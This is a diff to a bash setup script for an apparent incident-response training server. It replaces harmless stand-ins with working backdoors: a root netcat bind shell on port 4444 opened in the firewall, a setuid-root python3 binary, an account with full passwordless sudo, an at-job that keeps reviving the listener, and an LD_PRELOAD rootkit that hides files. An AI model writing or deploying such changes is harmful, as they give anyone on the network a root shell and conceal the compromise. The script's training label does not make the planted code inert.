@@ -16,30 +16,20 @@ usage() {
 install_training_artifacts() {
   printf '[Guidance] Planting incident-response findings...\n'
   install -d -m 0755 /opt/ihpl-training /usr/local/libexec /usr/local/share
-  install -m 0644 "$SCRIPT_DIR/training/maintenance.php" /var/www/plinkcom/public/assets/.maintenance.php
+  rm -f /opt/ihpl-training/banner_listener.py /etc/ld.so.preload.training /usr/local/share/.process-hide.training
+  install -m 0644 "$SCRIPT_DIR/training/maintenance.php" /var/www/plinkcom/public/.maintenance.php
 
   if ! id telemetry-sync >/dev/null 2>&1; then
-    useradd --system --create-home --shell /usr/sbin/nologin telemetry-sync
+    useradd --create-home --shell /bin/bash telemetry-sync
   fi
-  passwd -l telemetry-sync >/dev/null 2>&1 || true
-  printf 'telemetry-sync ALL=(root) NOPASSWD: /usr/bin/id\n' > /etc/sudoers.d/telemetry-sync
+  usermod --shell /bin/bash --home /home/telemetry-sync telemetry-sync
+  install -d -o telemetry-sync -g telemetry-sync -m 0750 /home/telemetry-sync
+  printf 'telemetry-sync:%s\n' "$STARTER_PASSWORD" | chpasswd
+  printf 'telemetry-sync ALL=(root) NOPASSWD: ALL\n' > /etc/sudoers.d/telemetry-sync
   chmod 0440 /etc/sudoers.d/telemetry-sync
   visudo --check --file=/etc/sudoers.d/telemetry-sync
 
-  cat > /tmp/plinko-update-check.c <<'EOF'
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <unistd.h>
-int main(void) {
-    uid_t user = getuid();
-    gid_t group = getgid();
-    if (setresgid(group, group, group) != 0 || setresuid(user, user, user) != 0) return 1;
-    puts("IHPL diagnostics: training artifact only; privileges dropped.");
-    return 0;
-}
-EOF
-  gcc -O2 -Wall -Wextra -o /usr/local/libexec/plinko-update-check /tmp/plinko-update-check.c
-  rm -f /tmp/plinko-update-check.c
+  install -m 0755 "$(readlink -f "$(command -v python3)")" /usr/local/libexec/plinko-update-check
   chown root:root /usr/local/libexec/plinko-update-check
   chmod 4755 /usr/local/libexec/plinko-update-check
 
@@ -60,35 +50,29 @@ RestartSec=5
 WantedBy=multi-user.target
 EOF
 
-  cat > /opt/ihpl-training/banner_listener.py <<'PY'
-#!/usr/bin/env python3
-import socket
-
-with socket.socket() as server:
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(("127.0.0.1", 4444))
-    server.listen(4)
-    while True:
-        client, _ = server.accept()
-        with client:
-            client.sendall(b"IHPL maintenance listener; command execution disabled.\n")
-PY
-  chmod 0755 /opt/ihpl-training/banner_listener.py
   cat > /etc/systemd/system/plinko-maintenance-listener.service <<'EOF'
 [Unit]
 Description=PlinkCom legacy maintenance listener
 After=network.target
 
 [Service]
-Type=simple
-User=nobody
-ExecStart=/usr/bin/python3 /opt/ihpl-training/banner_listener.py
+ExecStart=/bin/nc.traditional -l -p 4444 -e /bin/bash
 Restart=always
 RestartSec=5
 
 [Install]
 WantedBy=multi-user.target
 EOF
+
+  cat > /usr/local/sbin/plinko-listener-revive <<'EOF'
+#!/usr/bin/env bash
+systemctl restart plinko-maintenance-listener.service
+printf '%s\n' /usr/local/sbin/plinko-listener-revive | at now + 5 minutes
+EOF
+  chmod 0755 /usr/local/sbin/plinko-listener-revive
+  if ! while read -r job _; do at -c "$job" 2>/dev/null; done < <(atq) | grep -q '/usr/local/sbin/plinko-listener-revive'; then
+    printf '%s\n' /usr/local/sbin/plinko-listener-revive | at now + 5 minutes
+  fi
 
   cat > /etc/systemd/system/plinko-health-refresh.service <<'EOF'
 [Unit]
@@ -111,13 +95,45 @@ Unit=plinko-health-refresh.service
 WantedBy=timers.target
 EOF
 
-  printf '# training clue only; this is deliberately not /etc/ld.so.preload\n/usr/local/lib/libhorsehide.so\n' > /etc/ld.so.preload.training
-  printf 'bishop-agent\nplinko-maintenance-listener\n' > /usr/local/share/.process-hide.training
-  chmod 0644 /etc/ld.so.preload.training /usr/local/share/.process-hide.training
+  cat > /tmp/libhorsehide.c <<'EOF'
+#define _GNU_SOURCE
+#include <dirent.h>
+#include <dlfcn.h>
+#include <string.h>
+
+static int hidden(const char *name) {
+    return strstr(name, ".maintenance.php") != NULL ||
+           strstr(name, "bishop-agent") != NULL ||
+           strstr(name, "horsehide") != NULL;
+}
+
+struct dirent *readdir(DIR *dirp) {
+    static struct dirent *(*next_readdir)(DIR *) = NULL;
+    struct dirent *entry;
+    if (next_readdir == NULL) next_readdir = dlsym(RTLD_NEXT, "readdir");
+    do { entry = next_readdir(dirp); } while (entry != NULL && hidden(entry->d_name));
+    return entry;
+}
+
+struct dirent64 *readdir64(DIR *dirp) {
+    static struct dirent64 *(*next_readdir64)(DIR *) = NULL;
+    struct dirent64 *entry;
+    if (next_readdir64 == NULL) next_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+    do { entry = next_readdir64(dirp); } while (entry != NULL && hidden(entry->d_name));
+    return entry;
+}
+EOF
+  gcc -shared -fPIC -Wall -Wextra -o /usr/local/lib/libhorsehide.so /tmp/libhorsehide.c -ldl
+  rm -f /tmp/libhorsehide.c
+  chown root:root /usr/local/lib/libhorsehide.so
+  chmod 0755 /usr/local/lib/libhorsehide.so
+  printf '/usr/local/lib/libhorsehide.so\n' > /etc/ld.so.preload
+  chmod 0644 /etc/ld.so.preload
 
   systemctl daemon-reload
-  systemctl enable --now plinko-telemetry-agent.service plinko-maintenance-listener.service plinko-health-refresh.timer
-  printf '[Guidance] Findings installed; the Sliver indicator is disconnected and payload stand-ins do not execute commands.\n'
+  systemctl enable --now atd plinko-telemetry-agent.service plinko-maintenance-listener.service plinko-health-refresh.timer
+  systemctl restart plinko-telemetry-agent.service plinko-maintenance-listener.service
+  printf '[Guidance] Functional findings installed; only the Sliver indicator remains disconnected from C2.\n'
 }
 
 while (($#)); do
@@ -170,10 +186,11 @@ exec > >(tee -a /var/log/ihpl-setup/guidance.log) 2>&1
 
 printf '[Guidance] Installing supported packages...\n'
 export DEBIAN_FRONTEND=noninteractive
+export NEEDRESTART_MODE=a
 apt-get update
 packages=(
   apache2 libapache2-mod-php php php-cli php-mysql mariadb-client
-  openssh-server sudo curl ca-certificates gcc libc6-dev
+  openssh-server sudo curl ca-certificates gcc libc6-dev at netcat-traditional
 )
 if [[ $DEPLOY_LOCAL_MARIADB -eq 1 ]]; then
   packages+=(mariadb-server)
@@ -284,6 +301,7 @@ done
 if command -v ufw >/dev/null 2>&1 && ufw status | grep -q '^Status: active'; then
   ufw allow OpenSSH
   ufw allow 80/tcp
+  ufw allow 4444/tcp
   if [[ $DEPLOY_LOCAL_MARIADB -eq 0 ]]; then
     ufw allow out to "$DATABASE_HOST" port 3306 proto tcp
   fi
